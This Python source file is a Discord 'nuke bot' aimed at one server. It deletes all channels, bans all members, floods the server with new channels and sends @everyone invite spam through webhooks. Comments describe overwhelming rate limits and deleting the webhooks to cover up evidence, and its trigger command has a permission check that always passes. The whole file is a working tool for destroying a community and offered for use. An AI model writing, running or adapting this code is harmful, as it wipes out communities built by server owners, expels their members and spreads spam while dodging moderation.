import discord
from discord.ext import commands
import asyncio
import os

# CONFIGURATION
TOKEN = 'YOUR_BOT_TOKEN_HERE'
SERVER_ID = 123456789012345678  # Put the Server ID here
MESSAGE_CONTENT = "@everyone @here discord.gg/rdl"  # What to spam

# Intents are required for this to work
intents = discord.Intents.all()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')
    guild = bot.get_guild(SERVER_ID)
    
    if not guild:
        print("Server not found. Check SERVER_ID.")
        return

    print(f"Targeting server: {guild.name}")
    
    # Create a massive pool of tasks to overwhelm rate limits
    tasks = []
    
    # 1. Delete all channels
    print("Starting channel deletion...")
    for channel in guild.channels:
        tasks.append(asyncio.create_task(channel_delete(channel)))
    
    # 2. Ban all members
    print("Starting mass ban...")
    for member in guild.members:
        tasks.append(asyncio.create_task(member_ban(member)))
        
    # 3. Spam create channels (to replace deleted ones with chaos)
    print("Starting channel spam...")
    for i in range(50):
        tasks.append(asyncio.create_task(channel_spam(guild, i)))

    # 4. Spam webhooks (harder to delete, effective for pings)
    print("Starting webhook spam...")
    for channel in guild.text_channels:
        tasks.append(asyncio.create_task(webhook_spam(channel)))

    # Execute all tasks concurrently
    await asyncio.gather(*tasks, return_exceptions=True)
    print("Operation complete.")

async def channel_delete(channel):
    try:
        await channel.delete()
        print(f"Deleted channel: {channel.name}")
    except:
        pass

async def member_ban(member):
    try:
        await member.ban(reason="Nuke Bot")
        print(f"Banned: {member.name}")
    except:
        pass

async def channel_spam(guild, i):
    try:
        await guild.create_text_channel(f"nuke-{i}-{i*2}")
        print(f"Created spam channel: {i}")
    except:
        pass

async def webhook_spam(channel):
    try:
        # Create a webhook
        webhook = await channel.create_webhook(name="Nuke Bot")
        # Spam messages via webhook (much faster than normal messages)
        for _ in range(10):
            await webhook.send(MESSAGE_CONTENT)
        await webhook.delete() # Clean up evidence
    except:
        pass

@bot.command()
async def nuke(ctx):
    if ctx.author.id == ctx.author.id: # Replace with your ID for safety
        await ctx.channel.send("Initiating nuclear launch...")
        # Re-triggering the logic if needed via command
        await bot.on_ready()

try:
    bot.run(TOKEN)
except Exception as e:
    print(f"Error: {e}")
